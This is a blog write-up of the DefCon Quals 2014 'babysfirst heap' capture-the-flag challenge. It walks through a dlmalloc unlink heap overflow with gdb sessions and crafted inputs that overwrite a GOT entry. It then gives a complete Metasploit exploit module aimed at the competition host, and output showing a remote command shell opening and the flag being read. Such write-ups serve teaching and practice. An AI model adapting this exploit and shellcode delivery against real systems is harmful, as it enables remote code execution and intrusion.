---
layout: post
title: "DefCon Quals 2014 - babysfirst heap"
date: 2014-05-23 13:27
comments: true
author: stacks0n
categories: heap overflow, got overwrite
---

## Analysis
```
Welcome to your first heap overflow...
I am going to allocate 20 objects...
Using Dougle Lee Allocator 2.6.1...
Goodluck!

Exit function pointer is at 804C8AC address.
[ALLOC][loc=8ED2008][size=1246]
[ALLOC][loc=8ED24F0][size=1121]
[ALLOC][loc=8ED2958][size=947]
[ALLOC][loc=8ED2D10][size=741]
[ALLOC][loc=8ED3000][size=706]
[ALLOC][loc=8ED32C8][size=819]
[ALLOC][loc=8ED3600][size=673]
[ALLOC][loc=8ED38A8][size=1004]
[ALLOC][loc=8ED3C98][size=952]
[ALLOC][loc=8ED4058][size=755]
[ALLOC][loc=8ED4350][size=260]
[ALLOC][loc=8ED4458][size=877]
[ALLOC][loc=8ED47D0][size=1245]
[ALLOC][loc=8ED4CB8][size=1047]
[ALLOC][loc=8ED50D8][size=1152]
[ALLOC][loc=8ED5560][size=1047]
[ALLOC][loc=8ED5980][size=1059]
[ALLOC][loc=8ED5DA8][size=906]
[ALLOC][loc=8ED6138][size=879]
[ALLOC][loc=8ED64B0][size=823]
Write to object [size=260]:
Copied 16 bytes.
[FREE][address=8ED2008]
[FREE][address=8ED24F0]
[FREE][address=8ED2958]
[FREE][address=8ED2D10]
[FREE][address=8ED3000]
[FREE][address=8ED32C8]
[FREE][address=8ED3600]
[FREE][address=8ED38A8]
[FREE][address=8ED3C98]
[FREE][address=8ED4058]
[FREE][address=8ED4350]
[FREE][address=8ED4458]
[FREE][address=8ED47D0]
[FREE][address=8ED4CB8]
[FREE][address=8ED50D8]
[FREE][address=8ED5560]
[FREE][address=8ED5980]
[FREE][address=8ED5DA8]
[FREE][address=8ED6138]
[FREE][address=8ED64B0]
Did you forget to read the flag with your shellcode?
Exiting
```

Presumably a heap overflow. It appears as if we are going to write to the buffer that is allocated for 260 bytes, and presumably can overwrite into the next heap buffer. Looking at the addresses and sizes provided, all of the buffers are bumped up against one another. An uncontrolled write will allow us to overwrite heap metadata of another block, which when freed will attempt to unlink and coalesce. Let's play around with the inputs:

```bash
stacks0n@ubuntu:~/Desktop$ python -c 'print "AAAABBBB"+"C"*252+"\x00\x00\x00\x00"' > input
stacks0n@ubuntu:~/Desktop$ gdb babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
(gdb) run < input
Welcome to your first heap overflow...
I am going to allocate 20 objects...
Using Dougle Lee Allocator 2.6.1...
Goodluck!

Exit function pointer is at 804C8AC address.
[ALLOC][loc=804D008][size=1246]
[ALLOC][loc=804D4F0][size=1121]
[ALLOC][loc=804D958][size=947]
[ALLOC][loc=804DD10][size=741]
[ALLOC][loc=804E000][size=706]
[ALLOC][loc=804E2C8][size=819]
[ALLOC][loc=804E600][size=673]
[ALLOC][loc=804E8A8][size=1004]
[ALLOC][loc=804EC98][size=952]
[ALLOC][loc=804F058][size=755]
[ALLOC][loc=804F350][size=260]
[ALLOC][loc=804F458][size=877]
[ALLOC][loc=804F7D0][size=1245]
[ALLOC][loc=804FCB8][size=1047]
[ALLOC][loc=80500D8][size=1152]
[ALLOC][loc=8050560][size=1047]
[ALLOC][loc=8050980][size=1059]
[ALLOC][loc=8050DA8][size=906]
[ALLOC][loc=8051138][size=879]
[ALLOC][loc=80514B0][size=823]
Write to object [size=260]:
Copied 265 bytes.
[FREE][address=804D008]
[FREE][address=804D4F0]
[FREE][address=804D958]
[FREE][address=804DD10]
[FREE][address=804E000]
[FREE][address=804E2C8]
[FREE][address=804E600]
[FREE][address=804E8A8]
[FREE][address=804EC98]
[FREE][address=804F058]

Program received signal SIGSEGV, Segmentation fault.
0x080493f6 in free (mem=0x804f058) at malloc.c:1259
1259    in malloc.c
(gdb) x /i $eip
=> 0x80493f6 <free+273>:   mov    %edx,0x8(%eax)
(gdb) info reg
eax            0x41414141   1094795585
ecx            0x804d004    134533124
edx            0x42424242   1111638594
```

There's a controlled 4-byte write. In order to gain execution, we can overwrite
the GOT (targeting printf(), which is repeatedly called in between freeing
buffers) or target the do\_exit() function pointer which they provide to us.

Let's target printf():
```bash
stacks0n@ubuntu:~/Desktop$ objdump -R babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c  | grep printf
0804c004 R_386_JUMP_SLOT   printf
```

Also, notice that this is occuring during the free of 0x804F058, the block prior to the one allocated for 260 bytes. Since the write is accessing eax+8, we need to subtract 8 from our target address. We can overwrite the GOT entry for printf to point to our shellcode on the heap. For this example, I'll replace "AAAA" with printf() GOT - 8, "BBBB" with heap buffer + 8 (to skip our addresses), and replace "C" with "\xCC", for a breakpoint.

```bash
stacks0n@ubuntu:~/Desktop$ python -c 'print "\xfc\xbf\x04\x08"+"\x58\xf3\x04\x08"+"\xCC"*252+"\x00\x00\x00\x00"' > input

(gdb) run < input
...
Program received signal SIGTRAP, Trace/breakpoint trap.
0x0804f359 in ?? ()
(gdb) x /5i $eip
=> 0x804f359:   int3
   0x804f35a:   int3
   0x804f35b:   int3
   0x804f35c:   cld
   0x804f35d:   mov    $0xcccc0804,%edi
(gdb) x /16bx $eip
0x804f359:  0xcc    0xcc    0xcc    0xfc    0xbf    0x04    0x08    0xcc
0x804f361:  0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
```

Great! We hit our breakpoint. However, notice that 0x0804bffc has been written here. That's due to unlink() fixing up both BK->FD and FD->BK. we can avoid this by putting a simple 'jmp' in our payload. For example, 'jmp 12' corresponds to '\xeb\x0c'.

## Code
Note, during the competition, this code was used for exploiting the service and
retrieving the key. It targeted overwriting the do\_exit() function pointer, which resulted in all buffers being freed prior to getting code execution. This required safely
```ruby
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'heap',
      'Description'    => %q{
            heap overflow
      },
      'Author'         => [ 'stacks0n' ],
      'Privileged'     => false,
      'Platform'       => [ 'linux' ],
                        'Arch'           => ARCH_X86,
      'Targets'        => [ [ 'Automatic', { }  ], ],
      'DefaultTarget'  => 0))

    register_options(
      [
                Opt::RHOST('babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me'),
        Opt::RPORT(4088)
      ], self.class)

  end

  def exploit
    connect

        data = sock.recv(2048)
        data = sock.recv(2048)
        print data
        addr = ""
        # [ALLOC][loc=874F058][size=755]
        data.split().each do |elem|
          if elem.match("\\[ALLOC\\]\\[loc=\(.*\)\\]\\[size=\(.*\)\\]")
            # size
            if $2 == "260"
              addr = $1
              addr = [addr.to_i(16)+8].pack("<V")
            end
          end
        end

        p = ""
        p += "\xa4\xc8\x04\x08" # do_exit() - 8
        p += addr
        p += "\xeb\x0C" # jmp 12
        p += "\x90"*16 # why not?
        p += payload.encoded
        p += "A" * (260 - p.size)
        p += "\x01\x00\x00\x00" # overwrite the size block
        p += "\xa4\xc8\x04\x08" # do_exit() - 8
        p += addr
        print_status p.inspect

        # send the payload
        sock.put(p + "\n")
        print_status sock.get_once

    handler
    disconnect
  end

end
```

## Solution
```
msf  exploit(heap) > exploit

[*] Started bind handler

I am going to allocate 20 objects...
Using Dougle Lee Allocator 2.6.1...
Goodluck!

Exit function pointer is at 804C8AC address.
[ALLOC][loc=9BFB008][size=1246]
[ALLOC][loc=9BFB4F0][size=1121]
[ALLOC][loc=9BFB958][size=947]
[ALLOC][loc=9BFBD10][size=741]
[ALLOC][loc=9BFC000][size=706]
[ALLOC][loc=9BFC2C8][size=819]
[ALLOC][loc=9BFC600][size=673]
[ALLOC][loc=9BFC8A8][size=1004]
[ALLOC][loc=9BFCC98][size=952]
[ALLOC][loc=9BFD058][size=755]
[ALLOC][loc=9BFD350][size=260]
[ALLOC][loc=9BFD458][size=877]
[ALLOC][loc=9BFD7D0][size=1245]
[ALLOC][loc=9BFDCB8][size=1047]
[ALLOC][loc=9BFE0D8][size=1152]
[ALLOC][loc=9BFE560][size=1047]
[ALLOC][loc=9BFE980][size=1059]
[ALLOC][loc=9BFEDA8][size=906]
[ALLOC][loc=9BFF138][size=879]
[ALLOC][loc=9BFF4B0][size=823]
Write to object [size=260]:
[*] Copied 273 bytes.

[*] Command shell session 1 opened (10.0.1.12:56273 -> 23.22.192.226:4444) at 2014-05-18 18:18:39 -0400

cat key
cat: key: No such file or directory
cd /home
ls
babyfirst-heap
ubuntu
cd b
/bin//sh: 5: cd: can't cd to b
cd babyfirst-heap
cat key
cat: key: No such file or directory
ls
babyfirst-heap
flag
cat flag
The flag is: Good job on that doubly linked list. Why don't you try something harder!!OMG!!
```
